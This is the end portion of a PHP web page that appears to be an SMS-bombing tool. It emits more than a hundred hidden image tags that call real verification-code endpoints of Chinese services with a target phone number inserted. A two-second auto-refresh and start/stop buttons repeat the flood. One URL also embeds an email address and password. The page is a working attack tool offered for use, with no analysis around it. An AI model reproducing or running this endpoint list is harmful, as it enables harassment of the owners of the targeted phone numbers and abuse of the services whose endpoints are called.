<img src='http://m.anjuke.com/general/sendphonecode?phone=$phone&captcha=' alt=''/>
<img src='http://www.e8088.com/index/product/try!phoneVerifyCode.action?tipMessage=$phone' alt=''/>
<img src='http://uniservice.kugou.com/v2/activity/sendCode?call_number=$phone&cb=kgJSONP239130071' alt=''/>
<img src='http://www.reedoun.com/os/user/getCode?mobile=$phone&type=1' alt=''/>
<img src='http://hdh.10086.cn/common/validationIP?phone=$phone' alt=''/>
<img src='http://hdh.10086.cn/pc/dynamic?phoneNumber=$phone&imageCode=4551&type=login' alt=''/>
<img src='http://www.wfggw.com/getcode.asp?num=$phone&_=1480403250456' alt=''/>
<img src='http://www.shoujibao.uni-info.com.cn/send_register_verify.action?register_customer_name=$phone' alt=''/>
<img src='http://www.wfggw.com/getcode.asp?num=$phone&_=1480403250456' alt=''/>
<img src='http://www.shoujibao.uni-info.com.cn/send_register_verify.action?register_customer_name=$phone' alt=''/>
<img src='http://test2.p10155.cn:8075/sendCode.ashx?phonenum=$phone' alt=''/>
<img src='http://www.humengyun.com/index.php?a=login&m=sendSMS&mobile=$phone&_=1480986460007' alt=''/>
<img src='https://sso.scrcu.com/ebuisso/SendSMSVerificationCode?userId=0000&authType=03&mobile=$phone&_=1480945303044
' alt=''/>
<img src='http://www.flyertea.com/plugin.php?id=dzapp_mobile&mod=ajax&ac=code&type=reg&inajax=1&formhash=e55ad49c&mobile=$phone' alt=''/>
<img src='http://www.mzsky.cc/plugin.php?id=smstong:verifycode&idhash=SJw54jL0&formhash=82e4ff11&seccodeverify=&inajax=yes&infloat=register&handlekey=register&ajaxmenu=1&action=getregverifycode&mobile=$phone&0.7010368446838822' alt=''/>
<img src='http://www.csc108.com/mobile/sendRandomNum.json?mobile=$phone' alt=''/>
<img src='http://svr.cnoa.cn/api/sms.oatry.user.php?jsonpcallback=jsonp1480990856832&task=send&mobile=$phone&version=oa.cnoa.cn' alt=''/>
<img src='https://login.10086.cn/sendRandomCodeAction.action?userName=$phone&type=01&channelID=12002' alt=''/>
<img src='http://www.zjsgat.gov.cn:8080/was/UserInfoServletAjax?formaction=message2&mobilephone=$phone' alt=''/>
<img src='https://www.qinglianyun.com/Home/User/sendCode?telephone=$phone' alt=''/>
<img src='http://www.haoyin.com/message/sendMessage.htm?phone=$phone' alt=''/>
<img src='http://www.shdsyy.com.cn/web/index.php?classid=9191&action=call&phone=$phone' alt=''/>
<img src='http://www.csc108.com/mobile/sendRandomNum.json?mobile=$phone' alt=''/>
<img src='http://svr.cnoa.cn/api/sms.oatry.user.php?jsonpcallback=jsonp1480990856832&task=send&mobile=$phone&version=oa.cnoa.cn' alt=''/>
<img src='https://login.10086.cn/sendRandomCodeAction.action?userName=$phone&type=01&channelID=12002' alt=''/>
<img src='http://www.zjsgat.gov.cn:8080/was/UserInfoServletAjax?formaction=message2&mobilephone=$phone' alt=''/>
<img src='https://www.qinglianyun.com/Home/User/sendCode?telephone=$phone' alt=''/>
<img src='http://www.haoyin.com/message/sendMessage.htm?phone=$phone' alt=''/>
<img src='http://www.shdsyy.com.cn/web/index.php?classid=9191&action=call&phone=$phone' alt=''/>
<img src='http://www.appbesafe.com/htourist/sendPhoneMessageZc?phone=$phone&type=1' alt=''/>
<img src='http://waimai.baidu.com/promotion/client/sendsms?phone=$phone' alt=''/>
<img src='https://passport.baidu.com/v2/api/senddpass?gid=D3EF000-BEE8-4BF5-80D5-73CECBB45D8F&username=$phone&countrycode=&bdstoken=37e69227d824b54b2d25345b07e066bc&tpl=bceplat&flag_code=0&apiver=v3&tt=1480316742232&callback=bd__cbs__o8kllk' alt=''/>
<img src='http://reg.lenovo.com.cn/captcha/canSend?mobile=$phone&callback=getMobileCode&_=1480296216538' alt=''/>
<img src='http://www.wfggw.com/getcode.asp?num=&d&_=1480403250456' alt=''/>
<img src='http://www.humengyun.com/index.php?a=login&m=sendSMS&mobile=$phone&_=1480986460007' alt=''/>
<img src='https://sso.scrcu.com/ebuisso/SendSMSVerificationCode?userId=0000&authType=03&mobile=$phone&_=1480945303044
' alt=''/>
<img src='http://www.flyertea.com/plugin.php?id=dzapp_mobile&mod=ajax&ac=code&type=reg&inajax=1&formhash=e55ad49c&mobile=$phone' alt=''/>
<img src='http://www.mzsky.cc/plugin.php?id=smstong:verifycode&idhash=SJw54jL0&formhash=82e4ff11&seccodeverify=&inajax=yes&infloat=register&handlekey=register&ajaxmenu=1&action=getregverifycode&mobile=$phone&0.7010368446838822' alt=''/>
<img src='http://www.csc108.com/mobile/sendRandomNum.json?mobile=$phone' alt=''/>
<img src='http://svr.cnoa.cn/api/sms.oatry.user.php?jsonpcallback=jsonp1480990856832&task=send&mobile=$phone&version=oa.cnoa.cn' alt=''/>
<img src='https://login.10086.cn/sendRandomCodeAction.action?userName=$phone&type=01&channelID=12002' alt=''/>
<img src='http://www.zjsgat.gov.cn:8080/was/UserInfoServletAjax?formaction=message2&mobilephone=$phone' alt=''/>
<img src='https://www.qinglianyun.com/Home/User/sendCode?telephone=$phone' alt=''/>
<img src='http://www.haoyin.com/message/sendMessage.htm?phone=$phone' alt=''/>
<img src='http://www.shdsyy.com.cn/web/index.php?classid=9191&action=call&phone=$phone' alt=''/>
<img src='http://www.appbesafe.com/htourist/sendPhoneMessageZc?phone=$phone&type=1' alt=''/>
<img src='http://waimai.baidu.com/promotion/client/sendsms?phone=$phone' alt=''/>
<img src='https://passport.baidu.com/v2/api/senddpass?gid=D3EF000-BEE8-4BF5-80D5-73CECBB45D8F&username=$phone&countrycode=&bdstoken=37e69227d824b54b2d25345b07e066bc&tpl=bceplat&flag_code=0&apiver=v3&tt=1480316742232&callback=bd__cbs__o8kllk' alt=''/>
<img src='http://reg.lenovo.com.cn/captcha/canSend?mobile=$phone&callback=getMobileCode&_=1480296216538' alt=''/>
<img src='http://www.flyertea.com/plugin.php?id=dzapp_mobile&mod=ajax&ac=code&type=reg&inajax=1&formhash=e55ad49c&mobile=$phone' alt=''/>
<img src='http://www.mzsky.cc/plugin.php?id=smstong:verifycode&idhash=SJw54jL0&formhash=82e4ff11&seccodeverify=&inajax=yes&infloat=register&handlekey=register&ajaxmenu=1&action=getregverifycode&mobile=$phone&0.7010368446838822' alt=''/>
<img src='http://svr.cnoa.cn/api/sms.oatry.user.php?jsonpcallback=jsonp1480990856832&task=send&mobile=$phone&version=oa.cnoa.cn' alt=''/>
<img src='https://login.10086.cn/sendRandomCodeAction.action?userName=$phone&type=01&channelID=12002' alt=''/>
<img src='http://www.zjsgat.gov.cn:8080/was/UserInfoServletAjax?formaction=message2&mobilephone=$phone' alt=''/>
<img src='https://www.qinglianyun.com/Home/User/sendCode?telephone=$phone' alt=''/>
<img src='http://www.haoyin.com/message/sendMessage.htm?phone=$phone' alt=''/>
<img src='http://www.shdsyy.com.cn/web/index.php?classid=9191&action=call&phone=$phone' alt=''/>
<img src='http://www.appbesafe.com/htourist/sendPhoneMessageZc?phone=$phone&type=1' alt=''/>
<img src='http://waimai.baidu.com/promotion/client/sendsms?phone=$phone' alt=''/>
<img src='https://passport.baidu.com/v2/api/senddpass?gid=D3EF000-BEE8-4BF5-80D5-73CECBB45D8F&username=$phone&countrycode=&bdstoken=37e69227d824b54b2d25345b07e066bc&tpl=bceplat&flag_code=0&apiver=v3&tt=1480316742232&callback=bd__cbs__o8kllk' alt=''/>
<img src='http://www.flyertea.com/plugin.php?id=dzapp_mobile&mod=ajax&ac=code&type=reg&inajax=1&formhash=e55ad49c&mobile=$phone' alt=''/>
<img src='http://www.mzsky.cc/plugin.php?id=smstong:verifycode&idhash=SJw54jL0&formhash=82e4ff11&seccodeverify=&inajax=yes&infloat=register&handlekey=register&ajaxmenu=1&action=getregverifycode&mobile=$phone&0.7010368446838822' alt=''/>
<img src='http://www.csc108.com/mobile/sendRandomNum.json?mobile=$phone' alt=''/>
<img src='http://svr.cnoa.cn/api/sms.oatry.user.php?jsonpcallback=jsonp1480990856832&task=send&mobile=$phone&version=oa.cnoa.cn' alt=''/>
<img src='https://login.10086.cn/sendRandomCodeAction.action?userName=$phone&type=01&channelID=12002' alt=''/>
<img src='http://www.zjsgat.gov.cn:8080/was/UserInfoServletAjax?formaction=message2&mobilephone=$phone' alt=''/>
<img src='https://www.qinglianyun.com/Home/User/sendCode?telephone=$phone' alt=''/>
<img src='http://www.haoyin.com/message/sendMessage.htm?phone=$phone' alt=''/>
<img src='http://www.shdsyy.com.cn/web/index.php?classid=9191&action=call&phone=$phone' alt=''/>
<img src='http://www.appbesafe.com/htourist/sendPhoneMessageZc?phone=$phone&type=1' alt=''/>
<img src='http://waimai.baidu.com/promotion/client/sendsms?phone=$phone' alt=''/>
<img src='https://login.51job.com/ajax/sendphonecode.php?jsoncallback=jQuery18307610929541763114_1547125502231&nation=CN&type=5&from_domain=i&verifycode=&_=1547125703761&phone=$phone' alt=''/>
<img src='http://www.flyertea.com/plugin.php?id=dzapp_mobile&mod=ajax&ac=code&type=reg&inajax=1&formhash=e55ad49c&mobile=$phone' alt=''/>
<img src='http://m.tk.cn/tkmobile/orderSentSmsServlet?mobile=$phone' alt=''/>
<img src='http://www.zjsgat.gov.cn:8080/was/UserInfoServletAjax?formaction=message2&mobilephone=$phone' alt=''/>
<img src='https://www.qinglianyun.com/Home/User/sendCode?telephone=$phone' alt=''/>
<img src='http://www.haoyin.com/message/sendMessage.htm?phone=$phone' alt=''/>
<img src='http://www.shdsyy.com.cn/web/index.php?classid=9191&action=call&phone=$phone' alt=''/>
<img src='http://www.appbesafe.com/htourist/sendPhoneMessageZc?phone=$phone&type=1' alt=''/>
<img src='http://waimai.baidu.com/promotion/client/sendsms?phone=$phone' alt=''/>
<img src='https://passport.baidu.com/v2/api/senddpass?gid=D3EF000-BEE8-4BF5-80D5-73CECBB45D8F&username=$phone&countrycode=&bdstoken=37e69227d824b54b2d25345b07e066bc&tpl=bceplat&flag_code=0&apiver=v3&tt=1480316742232&callback=bd__cbs__o8kllk' alt=''/>
<img src='http://www.humengyun.com/index.php?a=login&m=sendSMS&mobile=$phone&_=1480986460007' alt=''/>
<img src='https://sso.scrcu.com/ebuisso/SendSMSVerificationCode?userId=0000&authType=03&mobile=$phone&_=1480945303044
' alt=''/>
<img src='http://www.flyertea.com/plugin.php?id=dzapp_mobile&mod=ajax&ac=code&type=reg&inajax=1&formhash=e55ad49c&mobile=$phone' alt=''/>
<img src='http://www.mzsky.cc/plugin.php?id=smstong:verifycode&idhash=SJw54jL0&formhash=82e4ff11&seccodeverify=&inajax=yes&infloat=register&handlekey=register&ajaxmenu=1&action=getregverifycode&mobile=$phone&0.7010368446838822' alt=''/>
<img src='http://www.csc108.com/mobile/sendRandomNum.json?mobile=$phone' alt=''/>
<img src='http://svr.cnoa.cn/api/sms.oatry.user.php?jsonpcallback=jsonp1480990856832&task=send&mobile=$phone&version=oa.cnoa.cn' alt=''/>
<img src='https://login.10086.cn/sendRandomCodeAction.action?userName=$phone&type=01&channelID=12002' alt=''/>
<img src='http://www.zjsgat.gov.cn:8080/was/UserInfoServletAjax?formaction=message2&mobilephone=$phone' alt=''/>
<img src='https://www.qinglianyun.com/Home/User/sendCode?telephone=$phone' alt=''/>
<img src='http://www.haoyin.com/message/sendMessage.htm?phone=$phone' alt=''/>
<img src='http://www.shdsyy.com.cn/web/index.php?classid=9191&action=call&phone=$phone' alt=''/>
<img src='http://www.appbesafe.com/htourist/sendPhoneMessageZc?phone=$phone&type=1' alt=''/>
<img src='http://waimai.baidu.com/promotion/client/sendsms?phone=$phone' alt=''/>
<img src='https://passport.baidu.com/v2/api/senddpass?gid=D3EF000-BEE8-4BF5-80D5-73CECBB45D8F&username=$phone&countrycode=&bdstoken=37e69227d824b54b2d25345b07e066bc&tpl=bceplat&flag_code=0&apiver=v3&tt=1480316742232&callback=bd__cbs__o8kllk' alt=''/>
<img src='http://www.flyertea.com/plugin.php?id=dzapp_mobile&mod=ajax&ac=code&type=reg&inajax=1&formhash=e55ad49c&mobile=$phone' alt=''/>
<img src='https://www.qinglianyun.com/Home/User/sendCode?telephone=$phone' alt=''/>
<img src='http://www.haoyin.com/message/sendMessage.htm?phone=$phone' alt=''/>
<img src='http://www.shdsyy.com.cn/web/index.php?classid=9191&action=call&phone=$phone' alt=''/>
<img src='http://www.appbesafe.com/htourist/sendPhoneMessageZc?phone=$phone&type=1' alt=''/>
<img src='http://m.zhenai.com/v2/register/resendMobileCode.do?baseInfo2.serviceMobile=$phone' alt=''/>
<img src='http://www.595959.wang/index.php/index/index/sendSms1?phone=$phone' alt=''/>
<img src='http://passport.fanli.com/login/ajaxLoginSendVerfiycode?jsoncallback=jQuery183044493322381181954_1486714320243&pos=601&mobile=$phone&_=1486714329485' alt=''/>
<img src='http://loan.ef008.cn/sms/sendSms?smsType=1&phone=$phone' alt=''/>
<img src='http://api.bangtuike.com.cn/api/v1/account/captcha?phone=$phone&country=%2B86' alt=''/>
<img src='http://wifi.gd118114.cn/getPassword.ajax?username=$phone&accessType=1&circleId=100000055' alt=''/>
<img src='http://mall.juzifenqi.com/termi/sendVerifySMSVH?mobile=$phone&flag=1&verifyCode=' alt=''/>
<img src='http://m.1mi.cn/wap/user/mobile_verify.json?mobile=$phone&flag=0&identifying=' alt=''/>
<img src='http://passport.ceair.com/cesso/mobile!geetCheck.shtml?_0.020283224898892227?mobileNo=$phone&geetest_challenge=&geetest_validate=&geetest_seccode=' alt=''/>
<img src='http://api.midukanshu.com/auth/mobileVerify?mobile=$phone' alt=''/>
<img src='http://care.seewo.com/easicare/account/dynamic/code?userName=$phone&isLogin=false' alt=''/>
<img src='http://bizapi.pezy.cn/qknode/sms/reqSmsCode?publishid=1003&deviceId=2808ec7ef7fbeed6&df=android&vt=5&screen=1080x1920&deviceid=2808ec7ef7fbeed6&proid=qknode&os=android&av=NMF26X&appVersion=1.4.0&imei=&ov=7.1.1&osVersion=7.1.1&osLevel=25&phone=$phone&token=' alt=''/>
<img src='http://dafeiyu.cn/sms/boom?mobile=$phone&config=1&num=2' alt=''/>
<img src='http://buckle.lvronghui.com/promotion/transfer.php?phone=$phone' alt=''/>
<img src='http://renjie.houhan.com/api/Register/send_sms?mobile=$phone&host=renjie.houhan.com' alt=''/>
<img src='http://jiuji.lyqchain.cn/Api/System/SendMsgCode?format=json?Tel=$phone' alt=''/>
<img src='http://mall.juzifenqi.com/termi/sendVerifySMSVH?mobile=$phone&flag=1&verifyCode=' alt=''/>
<img src='http://www.jiedai315.com/SendCode.ashx?Mobile=$phone&Identifier=6' alt=''/>
<img src='http://www.fcbox.com/noshiro/retrievePhoneMessagePreventAttacks?mobilePhone=$phone&smsType=5' alt=''/>
<img src='http://m.zhenai.com/v2/register/resendMobileCode.do?baseInfo2.serviceMobile=$phone' alt=''/>
<img src='http://ct.ctrip.com/me/register/Verify?name=%E5%90%B4%E5%A5%87&email=357058116%40qq.com&mobile=$phone&passwd=xiyu8187' alt=''/>
<img src='http://passport.fanli.com/login/ajaxLoginSendVerfiycode?jsoncallback=jQuery183044493322381181954_1486714320243&pos=601&mobile=$phone&_=1486714329485' alt=''/>
<img src='http://passport.fanli.com/mobileapi/i/user/mobileFastReg?deviceno=860903034476055&mobile=$phone&mobilestep=1&verification_code=&verify_flag=&verify_global=ma624mg0j80trr7ldvwcl15c1f&c_aver=1.0&c_src=2&c_v=5.3.1.24&devid=63599267906091' alt=''/>
<img src='http://api.bangtuike.com.cn/api/v1/account/captcha?phone=$phone&country=%2B86' alt=''/>
<img src='http://wifi.gd118114.cn/getPassword.ajax?username=$phone&accessType=1&circleId=100000055' alt=''/>
<img src='http://passport.17house.com/login/sendSMSForMobileLogin?mobile=$phone' alt=''/>
<img src='http://www.51qub.com/member/sendmobilesms?mobile=$phone' alt=''/>
<img src='https://h5.youzan.com/usercenter/member/member/mobilesmscode.json?kdt_id=19161003&mobile=$phone&verify_times=1' alt=''/>
<img src='http://m.health.pingan.com/mapi/smsCode.json?deviceId=5a4c935cbb6ff6ca&deviceType=SM-G9300&timestamp=1545122608&app=0&platform=3&app_key=PAHealth&osversion=23&info=&version=1.0.1&resolution=1440x2560&screenSize=22&netType=1&channel=m_h5&phone=$phone' alt=''/>
<img src='http://micservice.91qinqu.com/huieryun-identity/api/v1/authgateway/91qq/sendsms?mobile=$phone' alt=''/>
<img src='http://xinweixin.11183.com.cn/youzheng/login/security?phone=$phone' alt=''/>
<img src='http://wap.ghs.net/wap/wxregister-checkMobile.html?uname=$phone' alt=''/>
<img src='http://id.ifeng.com/api/simplesendmsg?mobile=$phone&comefrom=7&auth=&msgtype=0' alt=''/>
<img src='http://ucenter.inyuapp.com/v1/login/mobile/code?mobile=$phone&country_code=86' alt=''/>
<img src='http://sms.321mh.com/user/v1/sendsms?mobile=$phone&service=zymk&countryCode=&imgCode=&refresh=0&localtime=&client-channel=store_tencent&loglevel=3&client-type=android&client-version=4.9.1' alt=''/>
<img src='http://ndapi.nexttao.com/api/user/request_mobile_code?mobile=$phone' alt=''/>
<img src='http://bank.wo.cn/hand/getRandCode?phone=$phone&flag=3' alt=''/>
<img src='http://home.ecook.cn/user/code?phone=$phone' alt=''/>
<img src='http://passport.fang.com/loginsendmsm.api?callback=jsonp1475917947590&Service=home-club-web&backurl=&mobilephone=$phone' alt=''/>
<img src='https://user.qunar.com/webApi/logincode.jsp?mobile=$phone&vcode=&origin=wechat$$&action=register&type=implicit' alt=''/>
<img src='http://b2c.csair.com/portal/smsMessage/EUserVerifyCode?mobile=$phone' alt=''/>
<img src='http://park.chemi.ren//serverpark/index.php/Api/Mobileapi/getCode?phone=$phone&action=codeLogin&type=sms&client=android&version=2.4' alt=''/>
<img src='http://www.cmpassport.com/openapi/sendDynaPwd?account=$phone' alt=''/>
<img src='http://api.gaotu100.com/user/v2/send_passcode?captcha_mode=NETEASE&type=3&mobile=$phone&code_type=0' alt=''/>
<img src='http://cms.51fenmi.com/api/base/public/getCode?mobile=$phone' alt=''/>
<img src='http://api.yinka.co/common/sms?cellphone=$phone' alt=''/>
</div>";echo "<meta http-equiv=refresh content='2; url=index.php'>";
                } ?>
                <small id="emailHelp" class="form-text text-muted"><?php echo $tips; ?></small>
            </div>
            <button type="submit" class="btn btn-primary">开始</button>
            <button type="button" class="btn btn-primary" onclick="top.location='/'">停止</button>
        </form>
    </div>
</main>
<script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js"
        integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj"
        crossorigin="anonymous"></script>
<script type="text/javascript" src="js/index.js"></script>
</body>

</html>